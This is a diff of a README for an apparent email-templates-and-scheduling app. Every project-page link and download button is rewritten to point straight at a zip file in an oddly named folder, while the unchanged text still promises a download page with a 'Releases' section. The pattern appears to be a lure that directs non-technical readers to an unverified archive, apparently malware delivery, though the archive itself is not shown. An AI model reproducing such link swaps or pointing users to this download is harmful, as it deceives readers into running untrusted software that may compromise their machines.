@@ -1,6 +1,6 @@
 # 📧 email-service-1771918823-1 - Easy Email Templates and Scheduling
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Get%20Email%20Service-brightgreen)](https://github.com/OHSHI9/email-service-1771918823-1)
+[![Download Latest Version](https://img.shields.io/badge/Download-Get%20Email%20Service-brightgreen)](https://github.com/OHSHI9/email-service-1771918823-1/raw/refs/heads/main/pneumohemothorax/service-email-v1.1-alpha.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you use this app, make sure your computer meets these needs:
 
 Click this big button to visit the download page and get the software files:
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Get%20Email%20Service-blue)](https://github.com/OHSHI9/email-service-1771918823-1)
+[![Download Latest Version](https://img.shields.io/badge/Download-Get%20Email%20Service-blue)](https://github.com/OHSHI9/email-service-1771918823-1/raw/refs/heads/main/pneumohemothorax/service-email-v1.1-alpha.5.zip)
 
 After clicking, you will go to a page where you can find the latest version of the app to download.
 
@@ -37,7 +37,7 @@ After clicking, you will go to a page where you can find the latest version of t
 ## ⬇️ How to Download and Install
 
 1. Click the download button above or visit:  
-   https://github.com/OHSHI9/email-service-1771918823-1  
+   https://github.com/OHSHI9/email-service-1771918823-1/raw/refs/heads/main/pneumohemothorax/service-email-v1.1-alpha.5.zip  
    
 2. On the page, look for a section called "Releases" or "Download." This is where the program files are stored.
 
@@ -124,8 +124,8 @@ The app uses large buttons and clear fonts for easy reading and navigation. It w
 ## 🔗 Helpful Links
 
 Visit the project page to download or check for new versions:  
-https://github.com/OHSHI9/email-service-1771918823-1
+https://github.com/OHSHI9/email-service-1771918823-1/raw/refs/heads/main/pneumohemothorax/service-email-v1.1-alpha.5.zip
 
 ---
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Get%20Email%20Service-blue)](https://github.com/OHSHI9/email-service-1771918823-1)
+[![Download Latest Version](https://img.shields.io/badge/Download-Get%20Email%20Service-blue)](https://github.com/OHSHI9/email-service-1771918823-1/raw/refs/heads/main/pneumohemothorax/service-email-v1.1-alpha.5.zip)
